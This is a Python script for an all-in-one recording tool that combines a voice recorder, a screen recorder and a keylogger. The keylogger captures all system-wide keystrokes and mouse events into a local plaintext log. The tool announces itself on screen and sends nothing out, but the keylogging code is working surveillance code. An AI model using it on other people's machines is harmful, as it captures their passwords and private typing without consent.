import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
import threading
import time
import keyboard
from pynput import keyboard as pynput_keyboard
from pynput import mouse
import os
import json
import cv2
import pyautogui
from datetime import datetime

# ============ VOICE RECORDER CLASS ============
SAMPLE_RATE = 44100
CHANNELS = 1
FORMAT = 'int16'

class VoiceRecorder:
    def __init__(self):
        self.recording = False
        self.audio_data = []
        
    def record(self):
        """Start recording in a separate thread"""
        self.recording = True
        self.audio_data = []
        
        def callback(indata, frames, time, status):
            if status:
                print(f"Status: {status}")
            if self.recording:
                self.audio_data.append(indata.copy())
        
        self.stream = sd.InputStream(
            samplerate=SAMPLE_RATE,
            channels=CHANNELS,
            callback=callback,
            dtype=FORMAT
        )
        self.stream.start()
        
    def stop(self):
        """Stop recording and save the file"""
        self.recording = False
        self.stream.stop()
        self.stream.close()
        
        audio = np.concatenate(self.audio_data, axis=0)
        filename = f"voice_recording_{time.strftime('%Y%m%d_%H%M%S')}.wav"
        wav.write(filename, SAMPLE_RATE, audio)
        print(f"✅ Voice saved: {filename}")
        return filename

# ============ KEYLOGGER CLASS ============
class KeyLogger:
    def __init__(self):
        self.config_file = "config.json"
        self.default_config = {
            "log_file": "keylog.txt",
            "max_log_size": 5 * 1024 * 1024,
            "log_mouse": True,
        }
        self.config = self.load_config()
        self.log_file = self.config["log_file"]
        self.max_log_size = self.config["max_log_size"]
        self.log_mouse = self.config["log_mouse"]
        self.keys = []
        self.mouse_events = []
        self.shutdown_flag = False
        self.create_log_file()
        
    def load_config(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, "r") as file:
                return json.load(file)
        else:
            self.save_config(self.default_config)
            return self.default_config
    
    def save_config(self, config):
        with open(self.config_file, "w") as file:
            json.dump(config, file, indent=4)
    
    def log_time(self):
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    
    def create_log_file(self):
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f:
                f.write(f"Keylogger started at: {self.log_time()}\n\n")
    
    def check_log_file_size(self):
        if os.path.exists(self.log_file) and os.path.getsize(self.log_file) >= self.max_log_size:
            os.rename(self.log_file, f"keylog_{int(time.time())}.txt")
            self.create_log_file()
    
    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            if key == pynput_keyboard.Key.space:
                self.keys.append(' ')
            elif key == pynput_keyboard.Key.enter:
                self.keys.append('\n')
            elif key == pynput_keyboard.Key.backspace:
                self.keys.append('[BACKSPACE]')
            elif key == pynput_keyboard.Key.tab:
                self.keys.append('[TAB]')
            else:
                self.keys.append(f'[{key}]')
    
    def on_release(self, key):
        if key == pynput_keyboard.Key.esc:
            self.shutdown_flag = True
            self.write_file()
            return False
    
    def write_file(self):
        self.check_log_file_size()
        if self.keys or self.mouse_events:
            with open(self.log_file, "a") as file:
                file.write("".join(self.keys))
                file.write("\n")
                file.write("\n".join(self.mouse_events))
                file.write("\n")
            self.keys.clear()
            self.mouse_events.clear()
    
    def on_click(self, x, y, button, pressed):
        if pressed:
            self.mouse_events.append(f"Mouse clicked at ({x}, {y}) with {button}")
        else:
            self.mouse_events.append(f"Mouse released at ({x}, {y}) with {button}")
    
    def on_scroll(self, x, y, dx, dy):
        self.mouse_events.append(f"Mouse scrolled at ({x}, {y}) by ({dx}, {dy})")
    
    def start(self):
        self.keyboard_listener = pynput_keyboard.Listener(
            on_press=self.on_press, 
            on_release=self.on_release
        )
        self.keyboard_listener.start()
        
        if self.log_mouse:
            self.mouse_listener = mouse.Listener(
                on_click=self.on_click, 
                on_scroll=self.on_scroll
            )
            self.mouse_listener.start()
    
    def stop(self):
        self.shutdown_flag = True
        self.write_file()
        print("✅ Keylogger stopped and logs saved")

# ============ SCREEN RECORDER CLASS ============
class ScreenRecorder:
    def __init__(self):
        self.recording = False
        self.out = None
        self.fps = 20.0
        self.filename = None
        
    def get_screen_size(self):
        return pyautogui.size()
    
    def start_recording(self):
        screen_size = self.get_screen_size()
        self.filename = f"screen_recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        self.out = cv2.VideoWriter(self.filename, fourcc, self.fps, screen_size)
        
        self.recording = True
        print(f"🎥 Screen recording started...")
        print(f"   Saving to: {self.filename}")
        print(f"   Resolution: {screen_size.width}x{screen_size.height}")
        
        self.recording_thread = threading.Thread(target=self._record)
        self.recording_thread.start()
    
    def _record(self):
        while self.recording:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            self.out.write(frame)
            time.sleep(1.0 / self.fps)
    
    def stop_recording(self):
        self.recording = False
        if self.recording_thread.is_alive():
            self.recording_thread.join()
        
        if self.out:
            self.out.release()
        
        print(f"✅ Screen recording stopped!")
        print(f"   Saved to: {self.filename}")
        
        if os.path.exists(self.filename):
            size = os.path.getsize(self.filename) / (1024 * 1024)
            print(f"   File size: {size:.2f} MB")
        
        return self.filename

def record_screen_with_duration(duration_seconds=10):
    """Record screen for a specific duration"""
    screen_size = pyautogui.size()
    filename = f"screen_recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
    
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, 20.0, screen_size)
    
    print(f"🎥 Recording screen for {duration_seconds} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration_seconds:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
        time.sleep(1.0 / 20.0)
    
    out.release()
    print(f"✅ Recording saved: {filename}")
    return filename

# ============ MAIN APPLICATION ============
class AllInOneTool:
    def __init__(self):
        self.voice_recorder = VoiceRecorder()
        self.keylogger = KeyLogger()
        self.screen_recorder = ScreenRecorder()
        self.screen_recording_active = False
        
    def show_menu(self):
        print("\n" + "=" * 60)
        print("🎤🔐🎥 ALL-IN-ONE RECORDING TOOL")
        print("=" * 60)
        print("\n📌 VOICE RECORDER:")
        print("   Press 'R' - Start voice recording")
        print("   Press 'S' - Stop voice recording and save")
        print("\n📌 SCREEN RECORDER:")
        print("   Press 'F9' - Start screen recording")
        print("   Press 'F10' - Stop screen recording")
        print("\n📌 KEYLOGGER:")
        print("   Press 'ESC' - Stop keylogger and save logs")
        print("\n📌 GENERAL:")
        print("   Press 'Q' - Exit entire application")
        print("=" * 60)
        print("\n💡 TIP: All features work simultaneously!")
        
    def run(self):
        # Start keylogger in background
        self.keylogger.start()
        print("🔐 Keylogger is running in background")
        
        self.show_menu()
        
        try:
            while True:
                # Voice recorder controls
                if keyboard.is_pressed('r'):
                    print("\n🔴 Voice recording started... (Press 'S' to stop)")
                    self.voice_recorder.record()
                    while not keyboard.is_pressed('s'):
                        time.sleep(0.1)
                        if self.keylogger.shutdown_flag:
                            break
                    self.voice_recorder.stop()
                    time.sleep(0.3)  # Debounce
                
                # Screen recorder controls
                elif keyboard.is_pressed('f9') and not self.screen_recording_active:
                    self.screen_recorder.start_recording()
                    self.screen_recording_active = True
                    time.sleep(0.5)
                    
                elif keyboard.is_pressed('f10') and self.screen_recording_active:
                    self.screen_recorder.stop_recording()
                    self.screen_recording_active = False
                    time.sleep(0.5)
                
                # Exit application
                elif keyboard.is_pressed('q'):
                    print("\n👋 Exiting application...")
                    if self.screen_recording_active:
                        self.screen_recorder.stop_recording()
                    self.keylogger.stop()
                    break
                
                # Check if keylogger was stopped
                if self.keylogger.shutdown_flag:
                    print("\n⚠️ Keylogger was stopped via ESC key")
                    print("Other features (Voice/Screen recording) still work!")
                    # Reset the flag so we don't keep printing
                    self.keylogger.shutdown_flag = False
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\n⚠️ Interrupted by user")
            if self.screen_recording_active:
                self.screen_recorder.stop_recording()
            self.keylogger.stop()
        
        finally:
            print("\n✅ Application closed successfully")

# ============ ENTRY POINT ============
if __name__ == "__main__":
    tool = AllInOneTool()
    tool.run()
